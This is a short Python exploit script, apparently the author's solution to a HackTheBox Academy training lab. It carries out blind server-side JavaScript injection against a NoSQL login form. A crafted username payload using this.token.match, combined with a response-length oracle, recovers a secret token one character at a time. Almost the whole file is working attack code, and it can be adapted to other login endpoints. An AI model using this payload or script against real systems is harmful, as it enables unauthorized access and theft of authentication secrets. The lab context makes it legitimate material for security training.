#! /usr/bin/env python3
# This script exploits a server side javascript injection on a NoSQL database.  
# Used this to solve the HackTheBox Academy - Skills Assessment II - MangoFile

import requests
import string


def nosqli():
    url="http://94.237.49.166:32713/login"

    proxies= {
        "http":"http://127.0.0.1:8080"
    }

    headers= {
        "Content-type":"application/x-www-form-urlencoded"
    }

    list=string.ascii_uppercase +string.digits
    counter= 0
    secret= ''
    
    while counter < 20:
        for char in list:
            data= f'''username="+||+this.token.match('^{secret}{char}.*')+||+""%3d%3d"//&password=test'''
            response= requests.post(url=url, proxies=proxies, headers=headers, data=data)    
            content= response.text
            char_count= len(content)            
            if char_count == 2191:
                counter += 1
                secret = secret + char
                if counter == 4 or counter == 8 or counter == 12 or counter == 16:
                    secret = secret + '-'
                else: 
                    pass
                print(secret)                
                break    
            else:
                pass

try:
    nosqli()        
except KeyboardInterrupt:
    print("Ctrl +c detected, shutting down gracefully...")
